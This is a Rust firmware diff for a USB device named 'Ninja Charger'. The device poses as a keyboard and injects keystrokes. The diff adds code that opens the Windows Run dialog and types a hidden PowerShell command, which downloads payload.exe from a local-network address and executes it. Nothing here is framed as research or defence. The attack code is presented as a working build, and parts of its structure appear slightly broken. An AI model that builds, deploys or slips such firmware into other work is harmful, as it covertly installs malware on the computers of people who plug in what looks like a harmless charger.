@@ -44,23 +44,35 @@ fn main() -> ! {
         .product("Ninja Charger")
         .serial_number("NINJA001")
         .build();
-    let seq: [KeyboardReport; 8] = [
-        KeyboardReport { modifier: 0x08, leds: 0, keycodes: [0x15, 0, 0, 0, 0, 0] }, // GUI+r
-        KeyboardReport { modifier: 0, leds: 0, keycodes: [0, 0, 0, 0, 0, 0] },
-        KeyboardReport { modifier: 0, leds: 0, keycodes: [0x13, 0x12, 0x1f, 0x28, 0, 0] }, // p w r ENTER
-        KeyboardReport { modifier: 0, leds: 0, keycodes: [0, 0, 0, 0, 0, 0] },
-        KeyboardReport { modifier: 0, leds: 0, keycodes: [0x17, 0x04, 0x15, 0x28, 0, 0] }, // s h e ENTER
-        KeyboardReport { modifier: 0, leds: 0, keycodes: [0, 0, 0, 0, 0, 0] },
-        KeyboardReport { modifier: 0, leds: 0, keycodes: [0x1c, 0x04, 0x15, 0x1f, 0x11, 0x07] }, // start.bat
-        KeyboardReport { modifier: 0, leds: 0, keycodes: [0x28, 0, 0, 0, 0, 0] },             // ENTER
-    ];
-    let mut idx = 0;
-    loop {
-        if dev.poll(&mut [&mut hid, &mut storage]) {
-            if idx < seq.len() {
-                hid.push_input(&seq[idx]).ok();
-                idx += 1;
+        static CMD: &str = "powershell -w hidden -c \"iwr http://192.168.0.100/payload.exe -o payload.exe; .\\payload.exe\"\n";
+
+        fn sc(c: u8) -> (u8, u8) {
+            match c {
+                b'a'..=b'z' => (0x04 + (c - b'a'), 0),
+                b'A'..=b'Z' => (0x04 + (c - b'A'), 0x02),
+                b'0'..=b'9' => ([0x27,0x1E,0x1F,0x20,0x21,0x22,0x23,0x24,0x25,0x26][(c-b'0') as usize], 0),
+                b' ' => (0x2C, 0), b'-' => (0x2D, 0), b'.' => (0x37, 0), b'/' => (0x38, 0),
+                b'\\' => (0x31, 0), b';' => (0x33, 0), b':' => (0x33, 0x02), b'_' => (0x2D, 0x02),
+                b'"' => (0x34, 0x02), b'\n' => (0x28, 0), _ => (0, 0)
             }
         }
-    }
+        
+        let mut sent_gui = false;
+        let mut pos = 0usize;
+        
+        loop {
+            if dev.poll(&mut [&mut hid, &mut storage]) {
+                if !sent_gui {
+                    hid.push_input(&KeyboardReport { modifier: 0x08, leds: 0, keycodes: [0x15,0,0,0,0,0] }).ok();
+                    hid.push_input(&KeyboardReport { modifier: 0, leds: 0, keycodes: [0;6] }).ok();
+                    sent_gui = true;
+                } else if pos < CMD.len() {
+                    let (kc, md) = sc(CMD.as_bytes()[pos]);
+                    hid.push_input(&KeyboardReport { modifier: md, leds: 0, keycodes: [kc,0,0,0,0,0] }).ok();
+                    hid.push_input(&KeyboardReport { modifier: 0,  leds: 0, keycodes: [0;6] }).ok();
+                    pos += 1;
+                }
+            }
+        }
+        
 }
